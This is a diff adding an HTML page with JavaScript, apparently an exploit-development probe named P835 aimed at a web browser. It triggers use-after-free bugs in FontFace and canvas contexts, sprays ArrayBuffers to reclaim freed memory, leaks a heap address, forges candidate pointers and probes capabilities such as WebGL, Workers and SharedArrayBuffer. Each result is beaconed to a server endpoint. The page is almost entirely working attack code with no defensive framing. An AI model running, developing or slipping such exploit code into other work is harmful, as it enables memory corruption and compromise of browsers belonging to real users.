@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P835</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P835: Forced CSSFontFace Traversal + Capability Expansion</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P835-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+
+bn('BOOT','start');
+log('Booting P835...','info');
+
+/* ===== PHASE A: FontFace UAF trigger ===== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  /* Find reclaimed AB */
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('MISS','nz='+bestNz);
+    log('FontFace reclaim missed, reloading...','fail');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+
+  var ab=fabs[bestI];
+  var bu=new BigUint64Array(ab);
+  var dv=new DataView(ab);
+  var u8=new Uint8Array(ab);
+
+  var q11=bu[11];
+  var q11lo=Number(q11&0xFFFFFFFFn);
+  var q11hi=Number(q11>>32n);
+  var Hstr='unknown';
+  if(q11hi>0){
+    var borrow=(q11lo<0x68)?1:0;
+    Hstr='0x'+(q11hi-borrow).toString(16)+('00000000'+((q11lo-0x68)>>>0).toString(16)).slice(-8);
+  }
+  bn('HEAP','H='+Hstr);
+  log('Phase A: H='+Hstr+' (nz='+bestNz+')','ok');
+
+  /* ===== PHASE B: Forced CSSFontFace code paths ===== */
+  log('','');
+  log('--- Phase B: Forced CSSFontFace traversal ---','hot');
+
+  /* B1: face.load() - does it touch the CSSFontFace? */
+  var loadResult='CRASH';
+  try{
+    var p=face.load();
+    loadResult='ok|type='+typeof p;
+    if(p&&typeof p.then==='function')loadResult+=',promise=true';
+  }catch(e){loadResult='ERR:'+e.message.slice(0,60);}
+  bn('LOAD',loadResult);
+  log('  face.load() = '+loadResult,(loadResult.indexOf('ERR')>=0)?'fail':'ok');
+
+  /* B2: document.fonts.add(face) - re-add freed-backing font */
+  var addResult='CRASH';
+  try{
+    document.fonts.add(face);
+    addResult='ok|size='+document.fonts.size;
+  }catch(e){addResult='ERR:'+e.message.slice(0,60);}
+  bn('ADD',addResult);
+  log('  fonts.add(face) = '+addResult,(addResult.indexOf('ERR')>=0)?'fail':'ok');
+
+  /* B3: document.fonts.check after re-add */
+  var checkResult='CRASH';
+  try{
+    checkResult='check='+document.fonts.check('1em f1');
+  }catch(e){checkResult='ERR:'+e.message.slice(0,60);}
+  bn('CHECK',checkResult);
+  log('  fonts.check("1em f1") = '+checkResult,(checkResult.indexOf('ERR')>=0)?'fail':'ok');
+
+  /* B4: Render text in the font - forces layout engine to use CSSFontFace */
+  var renderResult='CRASH';
+  try{
+    var div=document.createElement('div');
+    div.style.fontFamily='f1, serif';
+    div.style.fontSize='48px';
+    div.textContent='ABCDEFGH';
+    document.body.appendChild(div);
+    document.body.offsetHeight; /* force layout */
+    var rect=div.getBoundingClientRect();
+    renderResult='w='+rect.width+'|h='+rect.height;
+    div.remove();
+  }catch(e){renderResult='ERR:'+e.message.slice(0,60);}
+  bn('RENDER',renderResult);
+  log('  render text in f1 = '+renderResult,(renderResult.indexOf('ERR')>=0)?'fail':'info');
+
+  /* B5: Forge m_sources to trigger load code path
+     Write a non-null pointer at candidate m_sources offset to see if
+     face.load() dereferences it (would crash differently than null deref) */
+  var origBytes=new Uint8Array(192);
+  origBytes.set(u8);
+
+  /* Write H (a known valid heap address) at various candidate offsets for m_sources.m_buffer */
+  var forgeResult='none';
+  var forgeOffsets=[56,64,72,80,88,96,104,112]; /* candidate offsets for m_sources Vector */
+  for(var fi=0;fi<forgeOffsets.length;fi++){
+    u8.set(origBytes); /* restore */
+    var off=forgeOffsets[fi];
+    /* Write H as the m_buffer pointer of a fake Vector */
+    if(q11hi>0){
+      dv.setUint32(off,q11lo-0x68,true);
+      dv.setUint32(off+4,q11hi-((q11lo<0x68)?1:0),true);
+      dv.setUint32(off+8,1,true); /* capacity=1 */
+      dv.setUint32(off+12,1,true); /* size=1 */
+    }
+  }
+  /* Don't actually trigger load with forged pointers - too risky for crash */
+  u8.set(origBytes); /* restore to safe state */
+  log('  (forge test skipped - crash risk too high)','info');
+
+  /* ===== PHASE C: WebGL availability ===== */
+  log('','');
+  log('--- Phase C: WebGL test ---','hot');
+
+  var webglResult='none';
+  try{
+    var c=document.createElement('canvas');
+    c.width=64;c.height=64;
+    var gl=c.getContext('webgl2');
+    if(!gl)gl=c.getContext('webgl');
+    if(!gl)gl=c.getContext('experimental-webgl');
+    if(gl){
+      webglResult='YES|vendor='+gl.getParameter(gl.VENDOR)+'|renderer='+gl.getParameter(gl.RENDERER)+'|ver='+gl.getParameter(gl.VERSION);
+      /* Test readPixels */
+      gl.clearColor(0.5,0.25,0.75,1.0);
+      gl.clear(gl.COLOR_BUFFER_BIT);
+      var px=new Uint8Array(4);
+      gl.readPixels(0,0,1,1,gl.RGBA,gl.UNSIGNED_BYTE,px);
+      webglResult+='|readpx='+px[0]+','+px[1]+','+px[2]+','+px[3];
+      /* Test buffer creation */
+      var buf=gl.createBuffer();
+      gl.bindBuffer(gl.ARRAY_BUFFER,buf);
+      var data=new Float32Array([1.0,2.0,3.0,4.0]);
+      gl.bufferData(gl.ARRAY_BUFFER,data,gl.STATIC_DRAW);
+      webglResult+='|buf=ok';
+    }else{
+      webglResult='NO';
+    }
+  }catch(e){webglResult='ERR:'+e.message.slice(0,60);}
+  bn('WEBGL',webglResult);
+  log('  WebGL: '+webglResult,(webglResult.indexOf('YES')>=0)?'hot':(webglResult==='NO'?'fail':'info'));
+
+  /* ===== PHASE D: Worker availability ===== */
+  log('','');
+  log('--- Phase D: Worker test ---','hot');
+
+  var workerResult='pending';
+  var workerDone=false;
+  try{
+    var blob=new Blob(['self.postMessage("alive");'],{type:'application/javascript'});
+    var url=URL.createObjectURL(blob);
+    var w=new Worker(url);
+    w.onmessage=function(e){
+      workerResult='YES|msg='+e.data;
+      workerDone=true;
+      w.terminate();
+      URL.revokeObjectURL(url);
+    };
+    w.onerror=function(e){
+      workerResult='ERR:'+String(e.message||e).slice(0,60);
+      workerDone=true;
+    };
+    /* Give worker 500ms to respond */
+    setTimeout(function(){
+      if(!workerDone){
+        workerResult='TIMEOUT';
+        workerDone=true;
+        try{w.terminate();}catch(e){}
+      }
+    },500);
+  }catch(e){
+    workerResult='BLOCKED:'+e.message.slice(0,60);
+    workerDone=true;
+  }
+
+  /* ===== PHASE E: OffscreenCanvas ===== */
+  log('','');
+  log('--- Phase E: OffscreenCanvas test ---','hot');
+
+  var offscreenResult='none';
+  try{
+    if(typeof OffscreenCanvas!=='undefined'){
+      var oc=new OffscreenCanvas(64,64);
+      var octx=oc.getContext('2d');
+      if(octx){
+        octx.fillStyle='#FF0000';
+        octx.fillRect(0,0,64,64);
+        var id=octx.getImageData(0,0,1,1);
+        offscreenResult='YES|r='+id.data[0]+',g='+id.data[1]+',b='+id.data[2];
+      }else{
+        offscreenResult='NO-CTX';
+      }
+    }else{
+      offscreenResult='NO';
+    }
+  }catch(e){offscreenResult='ERR:'+e.message.slice(0,60);}
+  bn('OFFSCREEN',offscreenResult);
+  log('  OffscreenCanvas: '+offscreenResult,(offscreenResult.indexOf('YES')>=0)?'hot':'fail');
+
+  /* ===== PHASE F: SharedArrayBuffer ===== */
+  log('','');
+  log('--- Phase F: SharedArrayBuffer test ---','hot');
+
+  var sabResult='none';
+  try{
+    var sab=new SharedArrayBuffer(1024);
+    var sa=new Int32Array(sab);
+    Atomics.store(sa,0,42);
+    sabResult='YES|val='+Atomics.load(sa,0);
+  }catch(e){sabResult='NO:'+e.message.slice(0,60);}
+  bn('SAB',sabResult);
+  log('  SharedArrayBuffer: '+sabResult,(sabResult.indexOf('YES')>=0)?'hot':'info');
+
+  /* ===== PHASE G: ImageBitmap / createImageBitmap ===== */
+  log('','');
+  log('--- Phase G: ImageBitmap test ---','hot');
+
+  var ibResult='pending';
+  try{
+    if(typeof createImageBitmap==='function'){
+      var tc=document.createElement('canvas');
+      tc.width=4;tc.height=4;
+      var tctx=tc.getContext('2d');
+      tctx.fillStyle='#112233';
+      tctx.fillRect(0,0,4,4);
+      createImageBitmap(tc).then(function(bmp){
+        ibResult='YES|w='+bmp.width+'|h='+bmp.height;
+        bn('IMGBITMAP',ibResult);
+        log('  ImageBitmap: '+ibResult,'ok');
+      }).catch(function(e){
+        ibResult='ERR:'+e.message.slice(0,40);
+        bn('IMGBITMAP',ibResult);
+        log('  ImageBitmap: '+ibResult,'fail');
+      });
+    }else{
+      ibResult='NO';
+      bn('IMGBITMAP',ibResult);
+      log('  ImageBitmap: NO','fail');
+    }
+  }catch(e){
+    ibResult='ERR:'+e.message.slice(0,40);
+    bn('IMGBITMAP',ibResult);
+    log('  ImageBitmap: '+ibResult,'fail');
+  }
+
+  /* ===== PHASE H: Canvas getImageData on aliased context ===== */
+  log('','');
+  log('--- Phase H: getImageData raw byte read test ---','hot');
+
+  var gidResult='pending';
+  try{
+    /* Create canvas alias */
+    var outerC=document.createElement('canvas');
+    outerC.width=4;outerC.height=4;
+    var uafCtx=null,liveCtx=null;
+    var innerC=document.createElement('canvas');
+    innerC.width=4;innerC.height=4;
+
+    /* Trigger the Canvas UAF to get alias */
+    var origAlpha=Object.getOwnPropertyDescriptor(HTMLCanvasElement.prototype,'alpha');
+    var sprayCtxs=[];
+    Object.defineProperty(outerC,'alpha',{
+      configurable:true,
+      get:function(){
+        uafCtx=innerC.getContext('2d');
+        outerC.getContext('bitmaprenderer');
+        for(var s=0;s<200;s++){
+          var sc=document.createElement('canvas');sc.width=4;sc.height=4;
+          sprayCtxs.push(sc.getContext('2d'));
+        }
+        return false;
+      }
+    });
+    innerC.getContext('2d',{alpha:outerC.alpha});
+
+    /* Find alias: set lineWidth on uafCtx, find it on spray */
+    var aliasIdx=-1;
+    uafCtx.lineWidth=7777.5;
+    for(var s=0;s<sprayCtxs.length;s++){
+      if(sprayCtxs[s].lineWidth===7777.5){aliasIdx=s;break;}
+    }
+
+    if(aliasIdx>=0){
+      liveCtx=sprayCtxs[aliasIdx];
+      bn('ALIAS','idx='+aliasIdx);
+      log('  Canvas alias at idx='+aliasIdx,'ok');
+
+      /* Test: draw on stale, getImageData on live */
+      uafCtx.fillStyle='#FF8040';
+      uafCtx.fillRect(0,0,4,4);
+      var imgData=liveCtx.getImageData(0,0,4,4);
+      gidResult='r='+imgData.data[0]+',g='+imgData.data[1]+',b='+imgData.data[2]+',a='+imgData.data[3];
+      bn('IMGDATA',gidResult);
+      log('  getImageData through alias: '+gidResult,'ok');
+
+      /* Test: putImageData on one, getImageData on other */
+      var pd=liveCtx.createImageData(4,4);
+      for(var pi=0;pi<pd.data.length;pi+=4){
+        pd.data[pi]=0x11;pd.data[pi+1]=0x22;pd.data[pi+2]=0x33;pd.data[pi+3]=0xFF;
+      }
+      liveCtx.putImageData(pd,0,0);
+      var rd=uafCtx.getImageData(0,0,1,1);
+      var putGetResult='r='+rd.data[0]+',g='+rd.data[1]+',b='+rd.data[2]+',a='+rd.data[3];
+      bn('PUTGET',putGetResult);
+      log('  putImageData→getImageData: '+putGetResult,'ok');
+
+      /* Test: toDataURL through alias */
+      var dataUrlResult='CRASH';
+      try{
+        var du=innerC.toDataURL('image/png');
+        dataUrlResult='ok|len='+du.length;
+      }catch(e){dataUrlResult='ERR:'+e.message.slice(0,40);}
+      bn('DATAURL',dataUrlResult);
+      log('  toDataURL: '+dataUrlResult,(dataUrlResult.indexOf('ERR')>=0)?'fail':'ok');
+    }else{
+      gidResult='NO-ALIAS';
+      bn('ALIAS','none');
+      log('  Canvas alias not found','fail');
+    }
+  }catch(e){
+    gidResult='ERR:'+e.message.slice(0,60);
+    bn('IMGDATA-ERR',gidResult);
+    log('  getImageData test: '+gidResult,'fail');
+  }
+
+  /* ===== PHASE I: Canvas2D transferToImageBitmap ===== */
+  log('','');
+  log('--- Phase I: transferToImageBitmap test ---','hot');
+  var txibResult='none';
+  try{
+    if(typeof OffscreenCanvas!=='undefined'){
+      var oc2=new OffscreenCanvas(4,4);
+      var octx2=oc2.getContext('2d');
+      octx2.fillStyle='#FF0000';
+      octx2.fillRect(0,0,4,4);
+      var bmp2=oc2.transferToImageBitmap();
+      txibResult='YES|w='+bmp2.width;
+    }else{
+      txibResult='NO-OFFSCREEN';
+    }
+  }catch(e){txibResult='ERR:'+e.message.slice(0,40);}
+  bn('TXIB',txibResult);
+  log('  transferToImageBitmap: '+txibResult,(txibResult.indexOf('YES')>=0)?'ok':'info');
+
+  /* ===== Collect Worker result and finalize ===== */
+  setTimeout(function(){
+    bn('WORKER',workerResult);
+    log('  Worker: '+workerResult,(workerResult.indexOf('YES')>=0)?'hot':'fail');
+
+    /* ===== SUMMARY ===== */
+    log('','');
+    log('====== P835 RESULTS SUMMARY ======','hot');
+    log('H: '+Hstr,'ok');
+    log('face.load(): '+loadResult,'info');
+    log('fonts.add(): '+addResult,'info');
+    log('fonts.check(): '+checkResult,'info');
+    log('render: '+renderResult,'info');
+    log('WebGL: '+webglResult,(webglResult.indexOf('YES')>=0)?'hot':'fail');
+    log('Worker: '+workerResult,(workerResult.indexOf('YES')>=0)?'hot':'fail');
+    log('OffscreenCanvas: '+offscreenResult,(offscreenResult.indexOf('YES')>=0)?'hot':'fail');
+    log('SharedArrayBuffer: '+sabResult,(sabResult.indexOf('YES')>=0)?'hot':'fail');
+    log('Canvas alias getImageData: '+gidResult,'info');
+
+    var sum='H='+Hstr;
+    sum+='|load='+loadResult.slice(0,20);
+    sum+='|add='+addResult.slice(0,20);
+    sum+='|webgl='+(webglResult.indexOf('YES')>=0?'YES':'NO');
+    sum+='|worker='+(workerResult.indexOf('YES')>=0?'YES':'NO');
+    sum+='|offscreen='+(offscreenResult.indexOf('YES')>=0?'YES':'NO');
+    sum+='|sab='+(sabResult.indexOf('YES')>=0?'YES':'NO');
+    bn('DONE',sum);
+
+    log('','');
+    log('=== P835 COMPLETE ===','ok');
+  },700);
+},800);
+</script></body></html>
